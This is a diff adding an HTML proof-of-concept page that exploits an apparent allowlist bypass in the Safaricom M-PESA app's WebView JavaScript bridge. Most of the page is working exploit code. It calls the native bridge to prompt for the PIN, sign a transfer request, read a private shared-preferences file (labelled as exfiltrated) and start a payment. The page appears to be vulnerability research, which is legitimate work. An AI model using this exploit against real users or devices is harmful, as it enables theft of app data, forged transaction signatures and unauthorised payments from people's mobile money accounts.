@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safaricom M-PESA PoC — Native Bridge Hijacking</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background-color: #f7f9fa; }
+        .card { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); max-width: 600px; margin: 0 auto; }
+        h2 { color: #007A3D; margin-top: 0; }
+        .status { padding: 10px; border-radius: 4px; margin-bottom: 15px; font-weight: bold; }
+        .success { background-color: #d4edda; color: #155724; }
+        .danger { background-color: #f8d7da; color: #721c24; }
+        button { background-color: #007A3D; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 10px; }
+        button:hover { background-color: #005a2d; }
+        pre { background: #272822; color: #f8f8f2; padding: 12px; border-radius: 4px; overflow-x: auto; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Safaricom M-PESA Bridge Security PoC</h2>
+        <div id="bridge-status" class="status danger">Checking for window.consumerapp...</div>
+
+        <p>This page demonstrates unauthenticated native JavaScript bridge execution resulting from the allowlist substring bypass.</p>
+
+        <button onclick="triggerPinPrompt()">1. Trigger Native PIN Prompt (js_fun_verify_pin)</button>
+        <button onclick="triggerSignOracle()">2. Trigger Cryptographic Signing (js_fun_h5_sign)</button>
+        <button onclick="triggerFileTheft()">3. Exfiltrate App File (js_fun_get_file_by_app)</button>
+        <button onclick="triggerPayment()">4. Initiate Native Payment (js_fun_start_pay)</button>
+
+        <h3>Console Log:</h3>
+        <pre id="output">Waiting for actions...</pre>
+    </div>
+
+    <script>
+        const statusDiv = document.getElementById("bridge-status");
+        const outputPre = document.getElementById("output");
+
+        function log(msg) {
+            outputPre.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg + "\n" + outputPre.innerText;
+        }
+
+        // Check if injected bridge exists
+        if (window.consumerapp && typeof window.consumerapp.evaluate === "function") {
+            statusDiv.className = "status success";
+            statusDiv.innerText = "✓ Native Bridge 'window.consumerapp' DETECTED and ACTIVE!";
+            log("window.consumerapp interface bound successfully.");
+        } else {
+            statusDiv.className = "status danger";
+            statusDiv.innerText = "✗ Bridge NOT detected (Are you running inside M-PESA SafeWebView?)";
+            log("No consumerapp found on window.");
+        }
+
+        // Global Callbacks for Native Invocations
+        window.onPinResult = function(data) {
+            log("PIN RESULT RECEIVED FROM NATIVE: " + JSON.stringify(data));
+        };
+
+        window.onSignResult = function(data) {
+            log("CRYPTOGRAPHIC SIGNATURE RECEIVED: " + JSON.stringify(data));
+        };
+
+        window.onFileResult = function(data) {
+            log("PRIVATE APP FILE EXFILTRATED (Base64): " + JSON.stringify(data).substring(0, 100) + "...");
+        };
+
+        function triggerPinPrompt() {
+            log("Invoking js_fun_verify_pin...");
+            window.consumerapp.evaluate(JSON.stringify({
+                "functionName": "js_fun_verify_pin",
+                "params": { "callback": "onPinResult" }
+            }));
+        }
+
+        function triggerSignOracle() {
+            log("Invoking js_fun_h5_sign...");
+            window.consumerapp.evaluate(JSON.stringify({
+                "functionName": "js_fun_h5_sign",
+                "params": {
+                    "request": "{\"amount\":\"5000\",\"action\":\"TRANSFER\"}",
+                    "callback": "onSignResult"
+                }
+            }));
+        }
+
+        function triggerFileTheft() {
+            log("Invoking js_fun_get_file_by_app...");
+            window.consumerapp.evaluate(JSON.stringify({
+                "functionName": "js_fun_get_file_by_app",
+                "params": {
+                    "filePath": "content://com.safaricom.mpesa.lifestyle.utilcode.fileprovider/root/data/data/com.safaricom.mpesa.lifestyle/shared_prefs/sp_utils.xml",
+                    "callback": "onFileResult"
+                }
+            }));
+        }
+
+        function triggerPayment() {
+            log("Invoking js_fun_start_pay...");
+            window.consumerapp.evaluate(JSON.stringify({
+                "functionName": "js_fun_start_pay",
+                "params": {
+                    "tradeType": "1",
+                    "amount": "100",
+                    "payee": "Security Research PoC"
+                }
+            }));
+        }
+    </script>
+</body>
+</html>
